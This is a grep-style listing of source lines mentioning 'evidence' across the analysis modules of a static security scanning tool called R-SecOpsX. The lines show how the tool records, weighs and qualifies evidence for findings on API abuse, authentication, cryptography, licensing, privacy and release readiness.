+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\ai_model_risk_engine.py:224 | item["evidence_context"] = (
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\ai_model_risk_engine.py:236 | # or release-gating evidence.
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\api_abuse_engine.py:265 | "evidence": f"{path}:{line}: {snippet.strip()}",
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\api_abuse_engine.py:266 | "evidence_type": "route_definition_without_detected_control",
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\api_abuse_engine.py:400 | # is weaker evidence; keep it for review but do not over-promote it.
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\api_abuse_engine.py:405 | finding["evidence_status"] = "ROUTE_HEURISTIC_REVIEW_ONLY"
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\api_abuse_risk_engine.py:86 | "evidence": f"{method} {path}".strip(),
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\api_abuse_risk_engine.py:91 | "evidence_type": "route_definition_without_detected_control",
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\api_abuse_risk_engine.py:98 | "of controls outside the inspected evidence."
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\api_abuse_risk_engine.py:132 | # Multiple evidence sources can describe the same semantic route issue.
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\api_abuse_risk_engine.py:178 | # Prefer explicit HTTP-method evidence over a method-less duplicate.
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\audit_llm_two_candidates.py:88 | print("  UNCERTAIN            = insufficient evidence")
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\auth_hardening_correlation_engine.py:27 | evidence: str,
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\auth_hardening_correlation_engine.py:39 | "evidence": evidence,
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\auth_hardening_correlation_engine.py:91 | "Weak/default password evidence appears alongside missing rate-limit or account-lockout controls.",
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\auth_hardening_correlation_engine.py:103 | "Password policy weakness appears with no account-lockout control evidence.",
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\auth_hardening_correlation_engine.py:115 | "CAPTCHA weakness appears alongside missing login throttling or lockout control evidence.",
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\auth_hardening_correlation_engine.py:127 | "Weak reset-token generation appears with no session rotation evidence.",
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\auth_hardening_risk_engine.py:122 | _text(finding.get("evidence")),
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\auth_hardening_risk_engine.py:139 | evidence: str,
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\auth_hardening_risk_engine.py:148 | "evidence": evidence,
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\auth_hardening_risk_engine.py:256 | Scan only application-relevant authentication source evidence.
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\auth_hardening_risk_engine.py:325 | "evidence": clean,
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\auth_hardening_risk_engine.py:344 | CAPTCHA_TOKEN_EVIDENCE_PATTERNS = [
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\auth_hardening_risk_engine.py:361 | insufficient evidence. A concrete token/response signal must be present
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\auth_hardening_risk_engine.py:373 | if not _matches_any(text, CAPTCHA_TOKEN_EVIDENCE_PATTERNS):
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\auth_hardening_risk_engine.py:436 | str(ind.get("evidence") or "")[:120].lower(),
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\auth_hardening_risk_engine.py:451 | evidence = (
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\auth_hardening_risk_engine.py:453 | or finding.get("evidence", "")
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\auth_hardening_risk_engine.py:464 | evidence,
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\auth_hardening_risk_engine.py:475 | evidence,
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\auth_hardening_risk_engine.py:486 | evidence,
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\auth_hardening_risk_engine.py:497 | evidence,
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\benchmark_evidence_validation_v1.py:4 | R-SecOpsX EVIDEX / Evidence-Sink Validation Benchmark v1
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\benchmark_evidence_validation_v1.py:7 | It does not depend on analyzer_evidence_hardened_v1.py.
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\benchmark_evidence_validation_v1.py:82 | "evidence_score",
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\benchmark_evidence_validation_v1.py:83 | result.get("quality", result.get("evidence_quality", "")),
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\benchmark_evidence_validation_v1.py:102 | print("R-SecOpsX EVIDEX / EVIDENCE-SINK VALIDATION BENCHMARK v1")
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\benchmark_evidence_validation_v1.py:105 | validator = getattr(mod, "_validate_security_evidence", None)
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\benchmark_evidence_validation_v1.py:109 | print("ERROR: _validate_security_evidence() is not present in")
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\business_logic_correlation_engine.py:33 | evidence: str,
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\business_logic_correlation_engine.py:47 | "evidence": evidence,
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\business_logic_correlation_engine.py:120 | _text(item.get("evidence_match")),
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\business_logic_correlation_engine.py:121 | _text(item.get("evidence")),
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\business_logic_correlation_engine.py:136 | # standalone business-logic evidence. Require stronger anchors.
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\business_logic_correlation_engine.py:140 | workflow.extend([x for x in combined if any(t in _text(x.get(k)) for k in ("title", "description", "evidence", "snippet") for t in ("state transition", "workflow state", "state machine", "approval state", "step transition"))])
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\business_logic_correlation_engine.py:191 | "Workflow/state-transition risk without audit evidence",
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\business_logic_correlation_engine.py:195 | "Workflow or state-transition bypass indicators exist, but audit evidence is not observed in the same signal set.",
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\business_logic_correlation_engine.py:237 | corr["evidence_status"] = "POTENTIAL_REVIEW_ONLY"
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\business_logic_correlation_engine.py:246 | # Executive relevance requires confirmed workflow evidence and high-confidence
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\business_logic_correlation_engine.py:247 | # correlation evidence. Severity alone is not sufficient for executive escalation.
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\business_logic_correlation_engine.py:252 | and corr.get("evidence_status") != "POTENTIAL_REVIEW_ONLY"
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\business_logic_correlation_engine.py:270 | and c.get("evidence_status") != "POTENTIAL_REVIEW_ONLY"
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\business_logic_risk_engine.py:107 | str(finding.get("evidence", "")),
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\business_logic_risk_engine.py:128 | evidence: Dict[str, Any],
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\business_logic_risk_engine.py:140 | "evidence_match": match.group(0)[:200],
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\business_logic_risk_engine.py:146 | "evidence": evidence or {},
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\business_logic_risk_engine.py:156 | evidence = item.get("evidence", {}) or {}
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\business_logic_risk_engine.py:159 | evidence.get("file") or evidence.get("route") or evidence.get("agent") or "",
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\business_logic_risk_engine.py:160 | item.get("evidence_match") or "",
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\compare_llm_results.py:41 | x.get("evidence"),
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\compare_llm_results.py:71 | str(x.get("evidence", ""))[:220]
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\copyright_ip_compliance_engine.py:124 | return "Validate code origin, ownership rights, redistribution permissions, and approval evidence."
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\copyright_ip_compliance_engine.py:176 | # signal, not sufficient evidence of a project-wide GPL licensing
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\copyright_ip_compliance_engine.py:218 | "evidence_type": "SOURCE_TEXT_PATTERN",
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\copyright_ip_compliance_engine.py:219 | "evidence_match": match.group(0)[:160],
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\crypto_misuse_engine.py:65 | str(item.get("evidence", "")),
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\crypto_misuse_engine.py:102 | evidence: Dict[str, Any],
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\crypto_misuse_engine.py:123 | # contextual static evidence and are not auto-confirmed.
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\crypto_misuse_engine.py:126 | and evidence.get("finding_class") == "confirmed"
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\crypto_misuse_engine.py:127 | and evidence.get("evidence_valid") is True
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\crypto_misuse_engine.py:132 | "evidence_match": match.group(0)[:160],
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\crypto_misuse_engine.py:133 | "evidence": evidence or {},
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\crypto_misuse_engine.py:141 | # it is observed through FINDING, FILE_CONTEXT and CBOM evidence.
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\crypto_misuse_engine.py:144 | evidence = item.get("evidence") or {}
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\crypto_misuse_engine.py:146 | evidence.get("file")
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\crypto_misuse_engine.py:150 | line_key = evidence.get("line")
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\crypto_misuse_engine.py:151 | # Contexts are corroborating evidence for the same underlying usage.
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\crypto_misuse_engine.py:162 | item["evidence_contexts"] = [item.get("context_type")]
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\crypto_misuse_engine.py:166 | contexts = existing.setdefault("evidence_contexts", [])
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\crypto_misuse_engine.py:174 | item["evidence_contexts"] = contexts
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\data_flow_correlation_engine.py:31 | Returning None means source evidence is unavailable; callers must not interpret
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\data_flow_correlation_engine.py:32 | absence of source evidence as absence of a security control.
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\data_flow_correlation_engine.py:63 | """Require server-side route + object/data access evidence from source when available."""
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\data_flow_correlation_engine.py:76 | # Fallback is evidence-only and must never be used to infer missing auth.
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\data_flow_correlation_engine.py:91 | def _mk(kind,title,findings,evidence_note):
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\data_flow_correlation_engine.py:96 | return {"rule_id":f"CORR_{kind.upper()}","title":title,"vuln_type":kind,"severity":sev,"priority":_priority(sev),"confidence":"High" if len(findings)>1 else "Medium","language":base.get("language","unknown"),"file":_norm_file(base),"line":base.get("line",0),"snippet":base.get("snippet",""),"description":evidence_note,"remediation":["Enforce object-level authorization before repository/database access.","Validate tenant ownership in every data access path.","Use centralized authorization guards and regression tests.","Make workflow state transitions atomic and server-side enforced."],"owasp":"A01:2021 - Broken Access Control","cwe":"CWE-639","evidence":" | ".join(f"{_norm_file(f)}:{f.get('line')}:{f.get('title')}" for f in findings[:4]),"detection":"Data Flow Correlation","engine":"analysis.data_flow_correlation_engine","correlation_type":kind,"correlated_findings":findings,"group_key":f"CORR_{kind.upper()}|{_norm_file(base)}|{base.get('line',0)}","enterprise_control":True,
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\data_flow_correlation_engine.py:98 | "evidence_status": "CONTEXTUAL_NOT_CONFIRMED",
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\data_flow_correlation_engine.py:262 | "evidence": finding.get("evidence") or finding.get("snippet"),
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\data_flow_correlation_engine.py:267 | "evidence_status": "CONTEXTUAL_NOT_CONFIRMED",
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\data_flow_sensitivity_engine.py:116 | "evidence_match": name,
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\ddapi_abuse_engine.py:224 | "evidence": f"{path}:{line}: {snippet.strip()}",
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\dependency_graph_v2.py:6 | Only AUTHORITATIVE relationship evidence can produce a verified edge.
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\dependency_graph_v2.py:38 | evidence: str
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\dependency_graph_v2.py:267 | evidence="explicit dependency relationship field",
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\dependency_graph_v2.py:300 | "evidence_policy": (
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\executive_decision_engine.py:161 | ["No governance signals were identified from the available evidence."]
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\exposure_surface_engine.py:75 | "evidence_match": name,
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\exposure_surface_engine.py:152 | "evidence": [i["evidence_match"] for i in indicators],
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\external_baseline_comparator.py:5 | Stdlib only. Compares Dependency-Track evidence with R-SecOpsX clean_report.json.
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\external_baseline_comparator.py:96 | {"capability": "Vulnerability enumeration", "dependency_track": "Feed-dependent", "rsecopsx": f"{rx['vulnerable_packages']} vulnerable packages", "interpretation": "Captured Dependency-Track evidence showed no vulnerability enrichment; R-SecOpsX produced vulnerability signals."},
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\external_baseline_comparator.py:98 | {"capability": "KEV fusion", "dependency_track": "Not evidenced", "rsecopsx": f"{rx['kev_packages']} KEV packages", "interpretation": "R-SecOpsX integrates known-exploited vulnerability signal."},
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\external_baseline_comparator.py:99 | {"capability": "EPSS fusion", "dependency_track": "Not evidenced", "rsecopsx": f"{rx['known_epss_packages']} EPSS-enriched packages", "interpretation": "R-SecOpsX integrates exploit probability signal."},
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\external_baseline_comparator.py:119 | else "INVENTORY_BASELINE_VALID_VULNERABILITY_FEED_NOT_EVIDENCED"
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\external_baseline_comparator.py:140 | "In the captured baseline evidence, vulnerability enrichment was not observed; therefore, "
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\external_baseline_comparator.py:173 | {"Metric": "KEV packages", "Dependency-Track": "Not evidenced", "R-SecOpsX": rx["kev_packages"]},
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\external_baseline_comparator.py:174 | {"Metric": "EPSS-enriched packages", "Dependency-Track": "Not evidenced", "R-SecOpsX": rx["known_epss_packages"]},
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\framework_enrichment_engine.py:37 | return {"rule_id": rid, "title": title, "vuln_type": rid.lower(), "severity": sev, "priority": _priority(sev), "confidence":"Medium", "language":"framework", "file":str(file), "line":line, "snippet":snippet.strip(), "description":f"Framework-aware configuration or coding pattern detected for {fw}.", "remediation":["Apply secure framework defaults.", "Require authentication/authorization on sensitive routes.", "Add validation, rate limits and regression tests."], "owasp":owasp, "cwe":cwe, "evidence":f"{file}:{line}: {snippet.strip()}", "detection":"Framework-Aware Static Enrichment", "engine":"analysis.framework_enrichment_engine", **controls, "framework":fw, "enterprise_control":True, "group_key":f"{rid}|{file}|{line}"}
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\governance_signal_engine.py:52 | def _add_signal(signals: list[dict], signal_id: str, evidence_count: int, reason: str, severity_override: str | None = None):
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\governance_signal_engine.py:53 | if evidence_count <= 0:
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\governance_signal_engine.py:61 | "confidence": _confidence_from_count(evidence_count),
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\governance_signal_engine.py:63 | "evidence_count": evidence_count,
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\identity_access_correlation_engine.py:101 | finding.get("evidence"),
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\identity_access_correlation_engine.py:232 | evidence: str = "",
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\identity_access_correlation_engine.py:247 | "evidence": evidence,
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\identity_access_correlation_engine.py:282 | str(corr.get("evidence") or ""),
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\identity_access_correlation_engine.py:308 | evidence_text = " ".join([
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\identity_access_correlation_engine.py:310 | str(finding.get("evidence") or ""),
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\identity_access_correlation_engine.py:317 | explicit_secret_evidence = bool(_has_any(evidence_text, PRIVILEGED_TOKEN_KEYWORDS)) or bool(
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\identity_access_correlation_engine.py:318 | _has_any(evidence_text, ("hardcoded secret", "hardcoded credential", "private key", "api key", "access token"))
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\identity_access_correlation_engine.py:320 | is_secret = secret_rule or explicit_secret_evidence
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\identity_access_correlation_engine.py:330 | # A privileged route alone is not evidence that the finding contains
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\identity_access_correlation_engine.py:332 | # evidence in the finding itself before creating a Critical correlation.
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\identity_access_correlation_engine.py:333 | privileged_identity_evidence = _has_any(text, (
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\identity_access_correlation_engine.py:340 | if related_privileged_routes and privileged_identity_evidence:
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\identity_access_correlation_engine.py:352 | evidence=finding.get("snippet") or finding.get("evidence") or finding.get("title") or "",
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\identity_access_correlation_engine.py:372 | evidence=finding.get("snippet") or finding.get("evidence") or finding.get("title") or "",
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\identity_access_risk_engine.py:103 | "evidence_match": name,
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\inspect_abom.py:25 | i.get("evidence", "")[:250]
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\inspect_cbom.py:23 | i.get("evidence", "")[:250]
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\inspect_llm_missing.py:51 | "evidence=",
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\inspect_llm_missing.py:52 | r.get("evidence") or r.get("snippet", "")
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\juice_shop_ground_truth.py:4 | finding evidence directly identifies a Juice Shop challenge key that exists in
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\juice_shop_ground_truth.py:94 | def _finding_evidence(finding: dict) -> str:
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\juice_shop_ground_truth.py:96 | "title", "description", "snippet", "evidence", "taint_path",
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\juice_shop_ground_truth.py:104 | evidence = _finding_evidence(finding)
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\juice_shop_ground_truth.py:106 | for key in sorted(set(CHALLENGE_KEY_RE.findall(evidence))):
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\juice_shop_ground_truth.py:195 | # evidence context, not parsed as executable code.
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\juice_shop_ground_truth.py:318 | matching_basis = "DIRECT_CHALLENGE_KEY_EVIDENCE"
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\juice_shop_ground_truth.py:352 | "matching_basis": "NO_DIRECT_CHALLENGE_KEY_EVIDENCE",
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\juice_shop_ground_truth.py:359 | # UNDECLARED is reserved for future/manual adjudication evidence.
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\legacy_protocol_engine.py:60 | "evidence_match": name,
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\legacy_protocol_engine.py:114 | "description", "evidence", "value", "type", "bom-ref", "bom_ref",
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\legacy_protocol_engine.py:222 | "evidence": [i["evidence_match"] for i in indicators],
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\license_evidence_resolver.py:2 | R-SecOpsX V10 License Evidence Resolver v1
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\license_evidence_resolver.py:4 | Consumes the frozen, read-only License Evidence Resolver v2 evidence artifact.
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\license_evidence_resolver.py:15 | _EVIDENCE_FILE = (
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\license_evidence_resolver.py:18 | / "license_evidence"
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\license_evidence_resolver.py:19 | / "LICENSE_EVIDENCE_RESOLVER_V2.json"
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\license_evidence_resolver.py:23 | def _load_evidence() -> dict:
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\license_evidence_resolver.py:24 | if not _EVIDENCE_FILE.exists():
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\license_evidence_resolver.py:26 | with _EVIDENCE_FILE.open("r", encoding="utf-8") as handle:
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\license_evidence_resolver.py:33 | def _evidence_index(data: dict) -> dict[tuple[str, str], dict]:
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\license_evidence_resolver.py:61 | def enrich_license_evidence(payload: dict) -> dict:
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\license_evidence_resolver.py:63 | Attach canonical per-component license evidence.
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\license_evidence_resolver.py:66 | Evidence records are matched only by exact package/version identity.
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\license_evidence_resolver.py:68 | data = _load_evidence()
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\license_evidence_resolver.py:69 | index = _evidence_index(data)
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\license_evidence_resolver.py:71 | evidence_rows = []
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\license_policy_engine.py:140 | """Apply license policy using qualified/resolved evidence when available.
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\license_policy_engine.py:142 | Evidence precedence is deliberately explicit:
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\license_policy_engine.py:173 | # A non-unknown resolved value is qualified evidence and takes
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\license_policy_engine.py:179 | policy_source = "QUALIFIED_RESOLVED_EVIDENCE"
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\license_policy_engine.py:197 | item["license_policy_method"] = "RULE_BASED_LICENSE_POLICY_V3_QUALIFIED_EVIDENCE"
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\license_policy_engine.py:201 | item["license_evidence_qualified"] = True
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\license_policy_engine.py:202 | item["license_evidence_resolution_status"] = resolution_status or "RESOLVED_EVIDENCE"
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\license_policy_engine.py:204 | item["license_evidence_qualified"] = False
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\license_policy_engine.py:205 | item["license_evidence_resolution_status"] = resolution_status or "NO_RESOLVED_EVIDENCE"
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\llm_context_precision.py:198 | snippet = str(finding.get("snippet") or finding.get("evidence") or "")
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\npm_lock_graph_v2.py:8 | Evidence rule:
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\npm_lock_graph_v2.py:574 | "evidence_policy":
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\privacy_data_exposure_engine.py:159 | """Return PII hits only when the line has semantic evidence of data.
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\privacy_data_exposure_engine.py:230 | # lexical evidence anywhere in the source.
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\privacy_data_exposure_engine.py:646 | concrete PII evidence within a bounded semantic context.
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\privacy_data_exposure_engine.py:699 | Require PII evidence and an exposure sink within the same bounded
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\privacy_data_exposure_engine.py:725 | 2. Identify PII families that have lexical evidence.
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\privacy_data_exposure_engine.py:958 | f"| Observed: {sum(1 for i in indicators if i.get('privacy_evidence_state') == 'OBSERVED_ONLY'):,} "
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\privacy_data_exposure_engine.py:1037 | exposed, evidence_state = False, "OBSERVED_ONLY"
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\privacy_data_exposure_engine.py:1039 | exposed, evidence_state = _classify_exposure(text, exposure_hits)
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\privacy_data_exposure_engine.py:1051 | "privacy_evidence_state": evidence_state,
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\privacy_data_exposure_engine.py:1079 | "synthetic/test fixture paths excluded unless concrete data evidence exists",
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\privacy_data_exposure_engine.py:1091 | "privacy_evidence_state": "OBSERVED_ONLY",
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\privacy_data_exposure_engine.py:1113 | "requires independent privacy source-to-sink evidence before EXPOSED classification",
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\privacy_data_exposure_engine.py:1117 | # Every privacy indicator must have an explicit evidence state.  This is a
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\privacy_data_exposure_engine.py:1121 | if not _indicator.get("privacy_evidence_state"):
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\privacy_data_exposure_engine.py:1122 | _indicator["privacy_evidence_state"] = "OBSERVED_ONLY"
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\release_readiness_engine.py:29 | evidence: Dict[str, Any],
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\release_readiness_engine.py:39 | "evidence": evidence or {},
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\release_readiness_engine.py:168 | # Static crypto heuristics remain reviewable evidence, but do not create a
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\release_readiness_engine.py:241 | "High AI model, prompt, retrieval, or tool-execution risk with confirmed executive evidence.",
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\release_readiness_engine.py:274 | # global artifact evidence can block release; component observations
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\release_readiness_engine.py:324 | # absence evidence.
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\release_readiness_engine.py:328 | "Defense-in-depth controls were not observed in static evidence; this does not prove the controls are absent.",
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\release_readiness_engine.py:333 | "evidence_status": "NOT_OBSERVED_NOT_PROOF_OF_ABSENCE",
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\release_readiness_engine.py:351 | and c.get("evidence_status") == "CONFIRMED"
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\release_readiness_engine.py:357 | and c.get("evidence_status") == "CONFIRMED"
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\release_readiness_engine.py:382 | "evidence": {},
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\runtime_artifact_integrity_engine.py:107 | # artifact/runtime evidence.
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\runtime_artifact_integrity_engine.py:116 | "evidence_match": name,
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\runtime_artifact_integrity_engine.py:246 | "evidence": [i.get("evidence_match") for i in indicators],
